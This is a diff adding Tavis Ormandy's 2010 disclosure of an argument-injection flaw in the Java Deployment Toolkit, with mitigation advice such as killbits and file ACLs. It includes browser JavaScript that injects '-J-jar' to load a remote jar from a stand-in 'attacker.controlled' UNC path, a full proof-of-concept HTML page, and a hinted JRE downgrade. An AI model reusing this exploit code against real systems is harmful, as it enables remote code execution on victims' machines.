@@ -1,0 +1,251 @@
+Java Deployment Toolkit Performs Insufficient Validation of Parameters
+-------------------------------------------------------------------------
+
+Java Web Start (henceforth, jws) provides java developers with a way to let
+users launch and install their applications using a URL to a Java Networking
+Launching Protocol (.jnlp) file (essentially some xml describing the
+program).
+
+Since Java 6 Update 10, Sun has distributed an NPAPI plugin and ActiveX control
+called "Java Deployment Toolkit" to provide developers with a simpler method
+of distributing their applications to end users. This toolkit is installed by
+default with the JRE and marked safe for scripting.
+
+The launch() method provided by the toolkit object accepts a URL string, which
+it passes to the registered handler for JNLP files, which by default is the
+javaws utility.
+
+	$ cmd /c ver
+	Microsoft Windows XP [Version 5.1.2600]
+
+	$ java -version
+	java version "1.6.0_19"
+	Java(TM) SE Runtime Environment (build 1.6.0_19-b04)
+	Java HotSpot(TM) Client VM (build 16.2-b04, mixed mode, sharing)
+
+	$ cat /proc/registry/HKEY_LOCAL_MACHINE/SOFTWARE/Classes/JNLPFile/Shell/Open/Command/\@
+	"C:\Program Files\Java\jre6\bin\javaws.exe" "%1"
+
+The toolkit provides only minimal validation of the URL parameter, allowing us
+to pass arbitrary parameters to the javaws utility, which provides enough
+functionality via command line arguments to allow this error to be exploited.
+
+The simplicity with which this error can be discovered has convinced me
+that releasing this document is in the best interest of everyone except
+the vendor.
+
+--------------------
+Affected Software
+------------------------
+
+All versions since Java SE 6 update 10 for Microsoft Windows are believed to be
+affected by this vulnerability. Disabling the java plugin is not sufficient to
+prevent exploitation, as the toolkit is installed independently.
+
+http://java.sun.com/javase/6/docs/technotes/guides/jweb/deployment_advice.html
+
+I believe non-Windows installations are unaffected.
+
+--------------------
+Consequences
+-----------------------
+
+Exploitation of this issue is not terribly exciting, but is potentially of high
+enough impact to merit explanation. The javaws application supports the
+following command line parameters.
+
+	$ javaws -help
+	Usage:  javaws [run-options] <jnlp-file>
+		javaws [control-options]
+
+	where run-options include:
+ 	-verbose          display additional output
+ 	-offline          run the application in offline mode
+ 	-system           run the application from the system cache only
+ 	-Xnosplash        run without showing a splash screen
+ 	-J<option>        supply option to the vm
+ 	-wait             start java process and wait for its exit
+
+	control-options include:
+ 	-viewer           show the cache viewer in the java control panel
+ 	-uninstall        remove all applications from the cache
+ 	-uninstall <jnlp-file>                remove the application from the cache
+ 	-import [import-options] <jnlp-file>  import the application to the cache
+
+	import-options include:
+ 	-silent           import silently (with no user interface)
+ 	-system           import application into the system cache
+ 	-codebase <url>   retrieve resources from the given codebase
+ 	-shortcut         install shortcuts as if user allowed prompt
+ 	-association      install associations as if user allowed prompt
+
+Perhaps the most interesting of these is -J, and the obvious attack is simply
+to add -jar followed by an attacker controlled UNC path to the jvm command
+line, which I've demonstrated below. Other attacks are clearly possible, but
+this is sufficient to demonstrate the problem.
+
+In order to trigger this attack in Internet Explorer, an attacker would use a
+code sequence like this
+
+	/* ... */
+	var o = document.createElement("OBJECT");
+
+	o.classid = "clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA";
+
+	o.launch("http: -J-jar -J\\\\attacker.controlled\\exploit.jar none");
+	/* ... */
+
+	Or, for Mozilla Firefox
+
+	/* ... */
+	var o = document.createElement("OBJECT");
+
+	o.type = "application/npruntime-scriptable-plugin;deploymenttoolkit"
+
+	document.body.appendChild(o);
+
+	o.launch("http: -J-jar -J\\\\attacker.controlled\\exploit.jar none");
+	/* ... */
+
+Please note, at some point the registered MIME type was changed to
+application/java-deployment-toolkit, please verify which type applies to
+your users when verifying any mitigation implemented has been effective (the
+simplest way would be to look at the output of about:plugins on a reference
+machine).
+
+A harmless demonstration is provided below.
+http://lock.cmpxchg8b.com/bb5eafbc6c6e67e11c4afc88b4e1dd22/testcase.html
+
+<html>
+<head><title>Java Deployment Toolkit Test Page</title></head>
+<body>
+    <script>
+        // Tavis Ormandy <taviso@sdf.lonestar.org>, April 2010
+
+        var u = "http: -J-jar -J\\\\lock.cmpxchg8b.com\\calc.jar none";
+
+        if (window.navigator.appName == "Microsoft Internet Explorer") {
+            var o = document.createElement("OBJECT");
+
+            o.classid = "clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA";
+
+            // Trigger the bug
+            o.launch(u);
+        } else {
+            // Mozilla
+            var o = document.createElement("OBJECT");
+            var n = document.createElement("OBJECT");
+
+            o.type = "application/npruntime-scriptable-plugin;deploymenttoolkit";
+            n.type = "application/java-deployment-toolkit";
+            document.body.appendChild(o);
+            document.body.appendChild(n);
+
+            // Test both MIME types
+            try {
+                // Old type
+                o.launch(u);
+            } catch (e) {
+                // New type
+                n.launch(u);
+            }
+        }
+
+        // Bonus Vulnerability, why not downgrade victim to a JRE vulnerable to
+        // this classic exploit?
+        // http://sunsolve.sun.com/search/document.do?assetkey=1-66-244991-1
+
+        // o.installJRE("1.4.2_18");
+    </script>
+</body>
+</html>
+
+
+-------------------
+Mitigation
+-----------------------
+
+If you believe your users may be affected, you should consider applying one of
+the workarounds described below as a matter of urgency.
+
+- Internet Explorer users can be protected by temporarily setting the killbit
+ on CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA. To the best of my knowledge, the
+ deployment toolkit is not in widespread usage and is unlikely to impact end
+ users.
+
+- Mozilla Firefox and other NPAPI based browser users can be protected using
+ File System ACLs to prevent access to npdeploytk.dll. These ACLs can also be
+ managed via GPO.
+
+Detailed documentation on killbits is provided by Microsoft here
+
+http://support.microsoft.com/kb/240797
+
+Domain administrators can deploy killbits and File System ACLs using GPOs, for
+more information on Group Policy, see Microsoft's Group Policy site, here
+
+http://technet.microsoft.com/en-us/windowsserver/bb310732.aspx
+
+You may be tempted to kill the HKLM\...\JNLPFile\Shell\Open\Command key, but
+the author does not believe this is sufficient, as the plugin also provides
+enough functionality to install and downgrade JRE installations without
+prompting (seriously). However, if none of your affected users are local
+Administrators, this solution may work (untested).
+
+As always, if you do not require this feature, consider permanently disabling
+it in order to reduce attack surface.
+
+-------------------
+Solution
+-----------------------
+
+Sun has been informed about this vulnerability, however, they informed me they
+do not consider this vulnerability to be of high enough priority to break their
+quarterly patch cycle.
+
+For various reasons, I explained that I did did not agree, and intended to
+publish advice to temporarily disable the affected control until a solution is
+available.
+
+-------------------
+Credit
+-----------------------
+
+This bug was discovered by Tavis Ormandy.
+
+This work is my own, and all of the opinions expressed are mine, not my
+employers or anybody elses (I added this for you, Dan. Thanks ;-)).
+
+-------------------
+Greetz
+-----------------------
+
+Greetz to Julien, Neel, Redpig, Lcamtuf, Spoonm, Skylined, asiraP, LiquidK,
+ScaryBeasts, Headhntr, Jagger, Sami and Roach.
+
+Some very elite friends have started a consultancy called inverse path, you
+should really hire them.
+
+http://www.inversepath.com/
+
+-------------------
+References
+-----------------------
+
+- Deploying Java with JNLP, Sun Microsystems.
+ http://java.sun.com/developer/technicalArticles/Programming/jnlp/
+
+-------------------
+Notes
+-----------------------
+
+My advisories are intended to be consumed by a technical audience of security
+professionals and systems administrators who are familiar with the principal
+for which the mailing list you have subscribed to is named. If you do not fall
+into this category, you can get up to speed by reading this accessible and
+balanced essay on the disclosure debate by Bruce Schneier.
+
+http://www.schneier.com/crypto-gram-0111.html#1
+
+Some of us would appreciate it if you made the effort to research and
+understand the issues involved before condemning us :-)
